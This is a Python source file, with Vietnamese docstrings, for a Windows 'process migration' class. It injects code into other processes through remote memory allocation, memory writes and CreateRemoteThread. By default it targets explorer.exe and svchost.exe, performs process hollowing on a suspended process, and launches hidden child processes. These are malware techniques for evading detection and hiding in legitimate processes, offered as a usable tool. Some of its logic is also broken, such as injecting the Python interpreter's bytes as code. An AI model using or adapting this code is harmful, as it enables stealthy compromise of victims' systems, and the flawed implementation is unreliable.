from __future__ import annotations
import os
import sys
import ctypes
import psutil
import logging
from typing import Dict, List, Optional, Tuple, Any
from ctypes import windll, c_uint, c_int, byref, sizeof, create_string_buffer
from pathlib import Path

class ProcessMigration:
    def __init__(self) -> None:
        self.kernel32 = windll.kernel32
        self.ntdll = windll.ntdll
        
        # Windows API constants
        self.PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
        self.MEM_COMMIT = 0x00001000
        self.MEM_RESERVE = 0x00002000
        self.PAGE_EXECUTE_READWRITE = 0x40
        
        self.logger = logging.getLogger(__name__)
        
    def migrate(self, target_pid: int) -> bool:
        """Di chuyển code sang process khác

        Args:
            target_pid (int): Process ID đích

        Returns:
            bool: True if migration successful
        """
        try:
            # Read current code
            current_path = Path(sys.executable)
            code = current_path.read_bytes()
            
            # Open target process
            h_process = self.kernel32.OpenProcess(
                self.PROCESS_ALL_ACCESS,
                False,
                target_pid
            )
            
            if not h_process:
                self.logger.error(f"Failed to open process {target_pid}")
                return False
                
            try:
                # Allocate memory in target
                mem_addr = self.kernel32.VirtualAllocEx(
                    h_process,
                    None,
                    len(code),
                    self.MEM_COMMIT | self.MEM_RESERVE,
                    self.PAGE_EXECUTE_READWRITE
                )
                
                if not mem_addr:
                    raise Exception("Memory allocation failed")
                    
                # Write code to target
                written = c_uint(0)
                if not self.kernel32.WriteProcessMemory(
                    h_process,
                    mem_addr,
                    code,
                    len(code),
                    byref(written)
                ):
                    raise Exception("Failed to write code")
                    
                if written.value != len(code):
                    raise Exception("Failed to write all code")
                    
                # Create thread in target
                thread_id = c_uint(0)
                if not self.kernel32.CreateRemoteThread(
                    h_process,
                    None,
                    0,
                    mem_addr,
                    None,
                    0,
                    byref(thread_id)
                ):
                    raise Exception("Failed to create remote thread")
                    
                self.logger.info(f"Successfully migrated to process {target_pid}")
                return True
                
            finally:
                self.kernel32.CloseHandle(h_process)
                
        except Exception as e:
            self.logger.error(f"Migration error: {str(e)}")
            return False
            
    def find_target_process(self, criteria: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        """Tìm process phù hợp để migrate

        Args:
            criteria (Optional[Dict[str, Any]], optional): Search criteria. Defaults to None.

        Returns:
            List[Dict[str, Any]]: List of suitable processes
        """
        try:
            # Default target process names
            target_names = ['explorer.exe', 'svchost.exe']
            arch = self._is_process_64bit(os.getpid())
            
            if criteria:
                if 'names' in criteria:
                    target_names = criteria['names']
                    
            # Filter suitable processes  
            suitable_processes = []
            
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    # Check name
                    if proc.info['name'] not in target_names:
                        continue
                        
                    # Check architecture match
                    if self._is_process_64bit(proc.info['pid']) != arch:
                        continue
                        
                    # Check access rights
                    try:
                        h_process = self.kernel32.OpenProcess(
                            self.PROCESS_ALL_ACCESS,
                            False,
                            proc.info['pid']
                        )
                        if h_process:
                            self.kernel32.CloseHandle(h_process)
                            suitable_processes.append(proc.info)
                    except:
                        continue
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
            return suitable_processes
            
        except Exception as e:
            self.logger.error(f"Error finding target process: {str(e)}")
            return []
            
    def migrate_to_parent(self) -> bool:
        """Di chuyển sang process cha

        Returns:
            bool: True if successful
        """
        try:
            current_pid = os.getpid()
            parent_pid = psutil.Process(current_pid).ppid()
            
            return self.migrate(parent_pid)
            
        except Exception as e:
            self.logger.error(f"Error migrating to parent: {str(e)}")
            return False
            
    def migrate_to_child(self, command: str) -> bool:
        """Tạo process con và di chuyển vào đó

        Args:
            command (str): Command to create child process

        Returns:
            bool: True if successful
        """
        try:
            # Create child process
            startup = self._get_startup_info()
            process_info = self._create_process(command, startup)
            
            if not process_info:
                return False
                
            try:
                # Migrate to child
                result = self.migrate(process_info.dwProcessId)
                return result
                
            finally:
                # Cleanup handles
                self.kernel32.CloseHandle(process_info.hProcess)
                self.kernel32.CloseHandle(process_info.hThread)
                
        except Exception as e:
            self.logger.error(f"Error migrating to child: {str(e)}")
            return False
            
    def hollow_process(self, target_path: str) -> bool:
        """Thực hiện process hollowing

        Args:
            target_path (str): Path to target executable

        Returns:
            bool: True if successful
        """
        try:
            # Create suspended process
            startup = self._get_startup_info()
            process_info = self._create_process(
                target_path,
                startup,
                create_suspended=True
            )
            
            if not process_info:
                return False
                
            try:
                # Get process info
                pbi = self._get_process_basic_info(process_info.hProcess)
                if not pbi:
                    return False
                    
                # Unmap target process
                if not self.ntdll.NtUnmapViewOfSection(
                    process_info.hProcess,
                    pbi.PebBaseAddress
                ):
                    return False
                    
                # Read current code
                current_path = Path(sys.executable)
                code = current_path.read_bytes()
                
                # Allocate memory in target
                mem_addr = self.kernel32.VirtualAllocEx(
                    process_info.hProcess,
                    pbi.PebBaseAddress,
                    len(code),
                    self.MEM_COMMIT | self.MEM_RESERVE,
                    self.PAGE_EXECUTE_READWRITE
                )
                
                if not mem_addr:
                    return False
                    
                # Write code
                written = c_uint(0)
                if not self.kernel32.WriteProcessMemory(
                    process_info.hProcess,
                    mem_addr,
                    code,
                    len(code),
                    byref(written)
                ):
                    return False
                    
                # Resume thread
                self.kernel32.ResumeThread(process_info.hThread)
                
                self.logger.info(f"Successfully hollowed process {target_path}")
                return True
                
            finally:
                self.kernel32.CloseHandle(process_info.hProcess)
                self.kernel32.CloseHandle(process_info.hThread)
                
        except Exception as e:
            self.logger.error(f"Process hollowing error: {str(e)}")
            return False
            
    def _is_process_64bit(self, pid: int) -> Optional[bool]:
        """Kiểm tra process là 32-bit hay 64-bit

        Args:
            pid (int): Process ID to check

        Returns:
            Optional[bool]: True if 64-bit, False if 32-bit, None if error
        """
        try:
            # Open process
            h_process = self.kernel32.OpenProcess(
                self.PROCESS_ALL_ACCESS,
                False,
                pid
            )
            
            if not h_process:
                return None
                
            try:
                # Check Wow64 status
                is_wow64 = c_int(0)
                if self.kernel32.IsWow64Process(
                    h_process,
                    byref(is_wow64)
                ):
                    return not bool(is_wow64.value)
                    
            finally:
                self.kernel32.CloseHandle(h_process)
                
        except Exception as e:
            self.logger.error(f"Error checking process architecture: {str(e)}")
            
        return None
        
    def _get_startup_info(self) -> Any:
        """Get STARTUPINFO structure"""
        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ("cb", c_uint),
                ("lpReserved", ctypes.c_char_p),
                ("lpDesktop", ctypes.c_char_p),
                ("lpTitle", ctypes.c_char_p),
                ("dwX", c_uint),
                ("dwY", c_uint),
                ("dwXSize", c_uint),
                ("dwYSize", c_uint),
                ("dwXCountChars", c_uint),
                ("dwYCountChars", c_uint),
                ("dwFillAttribute", c_uint),
                ("dwFlags", c_uint),
                ("wShowWindow", ctypes.c_ushort),
                ("cbReserved2", ctypes.c_ushort),
                ("lpReserved2", ctypes.c_char_p),
                ("hStdInput", ctypes.c_void_p),
                ("hStdOutput", ctypes.c_void_p),
                ("hStdError", ctypes.c_void_p)
            ]
            
        startup = STARTUPINFO()
        startup.cb = sizeof(STARTUPINFO)
        startup.dwFlags = 1  # STARTF_USESHOWWINDOW
        startup.wShowWindow = 0  # SW_HIDE
        
        return startup
        
    def _create_process(self, command: str, startup: Any, 
                       create_suspended: bool = False) -> Optional[Any]:
        """Create new process

        Args:
            command (str): Command to execute
            startup (Any): STARTUPINFO structure
            create_suspended (bool, optional): Create suspended. Defaults to False.

        Returns:
            Optional[Any]: PROCESS_INFORMATION if successful
        """
        try:
            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", ctypes.c_void_p),
                    ("hThread", ctypes.c_void_p),
                    ("dwProcessId", c_uint),
                    ("dwThreadId", c_uint)
                ]
                
            process_info = PROCESS_INFORMATION()
            
            # Convert command to bytes
            cmd = create_string_buffer(command.encode())
            
            # Create process
            creation_flags = 0x04 if create_suspended else 0  # CREATE_SUSPENDED
            
            if self.kernel32.CreateProcessA(
                None,
                cmd,
                None,
                None,
                False,
                creation_flags,
                None,
                None,
                byref(startup),
                byref(process_info)
            ):
                return process_info
                
        except Exception as e:
            self.logger.error(f"Error creating process: {str(e)}")
            
        return None
        
    def _get_process_basic_info(self, h_process: Any) -> Optional[Any]:
        """Get process basic information

        Args:
            h_process (Any): Process handle

        Returns:
            Optional[Any]: PROCESS_BASIC_INFORMATION if successful
        """
        try:
            class PROCESS_BASIC_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("Reserved1", ctypes.c_void_p),
                    ("PebBaseAddress", ctypes.c_void_p),
                    ("Reserved2", ctypes.c_void_p * 2),
                    ("UniqueProcessId", ctypes.c_void_p),
                    ("Reserved3", ctypes.c_void_p)
                ]
                
            pbi = PROCESS_BASIC_INFORMATION()
            size = c_uint(0)
            
            status = self.ntdll.NtQueryInformationProcess(
                h_process,
                0,  # ProcessBasicInformation
                byref(pbi),
                sizeof(PROCESS_BASIC_INFORMATION),
                byref(size)
            )
            
            if status == 0:  # STATUS_SUCCESS
                return pbi
                
        except Exception as e:
            self.logger.error(f"Error getting process info: {str(e)}")
            
        return None